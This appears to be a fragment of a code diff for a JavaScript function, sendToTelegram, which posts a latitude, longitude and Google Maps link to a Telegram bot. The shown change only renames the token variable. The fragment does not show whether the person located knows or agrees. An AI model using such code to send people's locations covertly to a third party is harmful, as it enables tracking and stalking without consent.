@@ -184,7 +184,7 @@ function sendToTelegram(lat, lon){
 📍 ${lat}, ${lon}
 https://www.google.com/maps?q=${lat},${lon}`;
 
-  fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method:"POST",
     headers:{"Content-Type":"application/json"},
     body: JSON.stringify({
